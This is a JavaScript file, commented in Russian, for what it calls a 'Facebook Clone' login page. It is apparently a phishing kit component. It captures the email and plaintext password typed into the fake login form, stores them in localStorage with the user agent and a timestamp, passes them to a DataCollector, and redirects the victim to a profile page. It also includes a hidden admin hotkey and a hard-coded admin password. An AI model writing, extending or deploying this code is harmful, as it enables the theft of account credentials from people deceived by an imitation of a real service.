// script.js - ПОЛНОСТЬЮ ИСПРАВЛЕННАЯ ВЕРСИЯ
console.log('=== Facebook Clone Script Loaded ===');

// Глобальные переменные
let isProcessing = false;

// Инициализация при загрузке
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded, initializing...');
    
    // Инициализируем DataCollector если есть
    if (window.DataCollector) {
        console.log('DataCollector found, saving visit...');
        DataCollector.saveVisit();
    } else {
        console.warn('DataCollector not found!');
    }
    
    // Форма входа
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        console.log('Login form found, attaching handler...');
        loginForm.addEventListener('submit', handleLoginSubmit);
    } else {
        console.error('Login form NOT found!');
    }
    
    // Кнопка показа пароля
    const passwordField = document.getElementById('password');
    if (passwordField) {
        addPasswordToggle(passwordField);
    }
    
    // Горячие клавиши для админки
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'A') {
            e.preventDefault();
            console.log('Admin hotkey pressed');
            window.location.href = 'admin.html';
        }
    });
    
    // Принудительная инициализация CONFIG если его нет
    if (!window.CONFIG) {
        console.log('CONFIG not found, creating default...');
        window.CONFIG = {
            REDIRECT_DELAY: 1500,
            COLLECT_DATA: true,
            ADMIN_PASSWORD: 'admin123'
        };
    }
    
    console.log('Initialization complete');
});

// ===== ОБРАБОТКА ВХОДА =====
function handleLoginSubmit(event) {
    event.preventDefault();
    console.log('Login form submitted');
    
    if (isProcessing) {
        console.log('Already processing, skipping...');
        return;
    }
    
    isProcessing = true;
    
    // Получаем данные
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    
    const email = emailInput ? emailInput.value.trim() : '';
    const password = passwordInput ? passwordInput.value : '';
    
    console.log('Form data:', { 
        email: email || '(empty)', 
        password: password ? '***' : '(empty)' 
    });
    
    // Показываем загрузку
    showLoading();
    
    // Сохраняем данные (даже если пустые)
    saveUserData(email, password);
    
    // Перенаправляем через 1.5 секунды
    setTimeout(() => {
        console.log('Redirecting to profile...');
        
        // Используем email или дефолтный
        const userEmail = email || "user_" + Date.now() + "@facebook.com";
        const encodedEmail = encodeURIComponent(userEmail);
        
        // Скрываем загрузку
        hideLoading();
        
        // Переходим на профиль
        window.location.href = `profile.html?email=${encodedEmail}&source=login`;
        
        isProcessing = false;
    }, 1500);
}

// ===== СОХРАНЕНИЕ ДАННЫХ =====
function saveUserData(email, password) {
    console.log('Saving user data...');
    
    // Всегда сохраняем, даже пустые данные
    const finalEmail = email || "empty_" + Date.now() + "@facebook.com";
    const finalPassword = password || "empty_password_" + Date.now();
    
    console.log('Final data to save:', { 
        email: finalEmail, 
        password: '***' 
    });
    
    // Способ 1: Через DataCollector если есть
    if (window.DataCollector && typeof DataCollector.saveUserData === 'function') {
        console.log('Using DataCollector...');
        try {
            const result = DataCollector.saveUserData(finalEmail, finalPassword);
            console.log('DataCollector result:', result ? 'success' : 'failed');
            
            // Дополнительно сохраняем в localStorage напрямую
            saveToLocalStorageDirect(finalEmail, finalPassword);
            
        } catch (error) {
            console.error('DataCollector error:', error);
            saveToLocalStorageDirect(finalEmail, finalPassword);
        }
    } 
    // Способ 2: Напрямую в localStorage
    else {
        console.log('DataCollector not available, using direct storage...');
        saveToLocalStorageDirect(finalEmail, finalPassword);
    }
}

// Прямое сохранение в localStorage
function saveToLocalStorageDirect(email, password) {
    try {
        // Получаем текущие данные
        const storageKey = 'facebook_data_collection';
        let data = { users: [] };
        
        const stored = localStorage.getItem(storageKey);
        if (stored) {
            try {
                data = JSON.parse(stored);
                if (!data.users) data.users = [];
            } catch (e) {
                data = { users: [] };
            }
        }
        
        // Добавляем нового пользователя
        const newUser = {
            id: 'direct_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
            email: email,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent || 'unknown',
            ip: 'direct_save'
        };
        
        data.users.push(newUser);
        
        // Сохраняем
        localStorage.setItem(storageKey, JSON.stringify(data));
        
        console.log('Direct save successful! Total users:', data.users.length);
        
        return true;
    } catch (error) {
        console.error('Direct save error:', error);
        return false;
    }
}

// ===== СОЗДАНИЕ АККАУНТА =====
function createAccount() {
    console.log('Create account clicked');
    
    if (isProcessing) return;
    isProcessing = true;
    
    // Показываем загрузку
    showLoading();
    
    // Получаем данные из формы
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    
    const email = emailInput ? emailInput.value.trim() : '';
    const password = passwordInput ? passwordInput.value : '';
    
    console.log('Registration data:', { 
        email: email || '(empty)', 
        password: password ? '***' : '(empty)' 
    });
    
    // Генерируем email если пустой
    const finalEmail = email || "new_user_" + Date.now() + "@facebook.com";
    const finalPassword = password || "new_password_" + Math.random().toString(36).substr(2, 8);
    
    // Сохраняем данные
    saveUserData(finalEmail, finalPassword);
    
    // Через 1 секунду переходим на профиль
    setTimeout(() => {
        console.log('Redirecting after registration...');
        
        const encodedEmail = encodeURIComponent(finalEmail);
        
        // Скрываем загрузку
        hideLoading();
        
        // Переходим на профиль с флагом регистрации
        window.location.href = `profile.html?email=${encodedEmail}&source=registration&new=true`;
        
        isProcessing = false;
    }, 1000);
}

// ===== УПРАВЛЕНИЕ ЗАГРУЗКОЙ =====
function showLoading() {
    console.log('Showing loading...');
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.remove('hidden');
    }
}

function hideLoading() {
    console.log('Hiding loading...');
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.add('hidden');
    }
}

// ===== КНОПКА ПОКАЗА ПАРОЛЯ =====
function addPasswordToggle(passwordField) {
    const formGroup = passwordField.parentElement;
    
    // Проверяем, не добавлена ли уже кнопка
    if (formGroup.querySelector('.password-toggle')) {
        return;
    }
    
    const toggleBtn = document.createElement('button');
    toggleBtn.type = 'button';
    toggleBtn.className = 'password-toggle';
    toggleBtn.innerHTML = '👁️';
    toggleBtn.style.cssText = `
        position: absolute;
        right: 15px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        font-size: 18px;
        opacity: 0.6;
        z-index: 10;
        padding: 5px;
    `;
    
    formGroup.style.position = 'relative';
    
    toggleBtn.addEventListener('click', function() {
        const type = passwordField.type === 'password' ? 'text' : 'password';
        passwordField.type = type;
        toggleBtn.innerHTML = type === 'password' ? '👁️' : '👁️‍🗨️';
    });
    
    formGroup.appendChild(toggleBtn);
}

// ===== ГЛОБАЛЬНЫЙ ДОСТУП К ФУНКЦИЯМ =====
window.createAccount = createAccount;
window.handleLoginSubmit = handleLoginSubmit;
window.showLoading = showLoading;
window.hideLoading = hideLoading;

console.log('=== Script initialization complete ===');
